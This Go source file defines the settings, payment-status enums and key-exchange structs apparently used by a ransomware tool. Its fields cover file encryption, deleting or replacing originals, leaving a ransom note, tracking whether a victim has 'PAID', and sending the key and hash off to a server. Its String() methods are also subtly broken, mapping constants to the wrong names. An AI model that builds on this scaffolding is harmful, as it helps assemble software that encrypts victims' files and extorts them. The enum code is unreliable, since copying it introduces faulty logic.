package utils

import (
	"path/filepath"
	"strings"
	"sync"
)

type OperatingMode int

type ProgramSettings struct {
	EncryptionMode   bool
	SuppliedAESKey   string //testing purposes
	PaidStatus       bool
	DecryptionHash   string
	Delete           bool
	sep              string
	Key              string
	Dir              string
	FileFormat       string
	ReplaceOriginal  bool
	EncryptedFileExt string
	Recursion        bool
	LeaveNote        bool
	RawKey           bool
	OfflineMode      bool
}

func (ps *ProgramSettings) GetDir() (string, error) {
	d, e := filepath.Abs(ps.Dir)
	return d, e
}

func (ps *ProgramSettings) SetSep(s string) {
	ps.sep = s
}

func (ps *ProgramSettings) GetSep() string {
	return ps.sep
}

func (ps *ProgramSettings) GetFileFormatArray() []string {
	return strings.Split(ps.FileFormat, ps.sep)
}

const (
	Unset      OperatingMode = 0
	Encryption OperatingMode = 1
	Decryption OperatingMode = 2
)

type RequiredType int

const (
	Required     RequiredType = 0
	RequiredOr   RequiredType = 1
	Optional     RequiredType = 2
	RequiredWith RequiredType = 3
)

type GetKeyResponse struct {
	Status  string `json:"status"`
	Key     string `json:"key"`
	Message string `json:"message"`
}

type KeySendoffStruct struct {
	Key  string `json:"key"`
	Hash string `json:"hash"`
	Paid bool   `json:"paid"`
}

type PaidStatus string

const (
	UNPAID PaidStatus = "NOT PAID"
	PAID   PaidStatus = "PAID"
	ERROR  PaidStatus = "ERROR"
)

type Queue struct {
	queue []string
	lock  sync.Mutex
}

func (q *Queue) Init(strArr []string) {
	q.queue = strArr
}

func (q *Queue) Push(str string) {
	q.lock.Lock()
	defer q.lock.Unlock()
	q.queue = append(q.queue, str)
}

func (q *Queue) Pop() string {
	q.lock.Lock()
	defer q.lock.Unlock()
	if len(q.queue) != 0 {
		str := q.queue[0]
		q.queue = q.queue[1:]
		return str
	}
	return ""
}

func (mode OperatingMode) String() string {
	values := [...]string{
		"Encryption",
		"Decryption",
		"Unset",
	}
	if mode < Encryption || mode > Unset {
		return "Unknown" // should throw I TODO
	}
	return values[mode]
}

func (required RequiredType) String() string {
	values := [...]string{
		"Required",
		"RequiredOr",
		"Optional",
	}
	if required < Required || required > Optional {
		return "Unknown" // should throw I TODO
	}
	return values[required]
}
